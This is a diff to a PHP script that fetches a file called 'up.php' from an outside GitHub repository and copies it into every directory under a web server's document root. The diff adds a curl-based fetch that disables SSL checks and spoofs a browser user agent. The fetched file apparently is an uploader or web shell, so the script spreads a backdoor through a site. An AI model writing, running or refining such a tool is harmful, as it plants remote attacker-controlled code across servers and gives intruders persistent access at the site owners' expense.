@@ -5,6 +5,23 @@ $searchDir = $_SERVER['DOCUMENT_ROOT'];
 $sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/maw-gen/up.php";
 $logFile = "copy_report.txt";
 
+function fetchContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+
+    $data = curl_exec($ch);
+    if (curl_errno($ch)) {
+        curl_close($ch);
+        return false;
+    }
+    curl_close($ch);
+    return $data;
+}
+
 function copyToAllDirectories($dir, $url, $logFile) {
     if (!is_dir($dir)) {
         echo "[ERROR] Direktori tidak ditemukan: $dir\n";
@@ -14,7 +31,7 @@ function copyToAllDirectories($dir, $url, $logFile) {
     $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
     $logEntries = [];
 
-    $content = file_get_contents($url);
+    $content = fetchContent($url);
     if ($content === false || empty($content)) {
         echo "[ERROR] Gagal mengambil konten dari URL.\n";
         return;
@@ -44,7 +61,6 @@ function copyToAllDirectories($dir, $url, $logFile) {
         file_put_contents($logFile, implode("\n", $logEntries) . "\n", FILE_APPEND);
     }
 }
-
 
 copyToAllDirectories($searchDir, $sourceUrl, $logFile);
 ?>
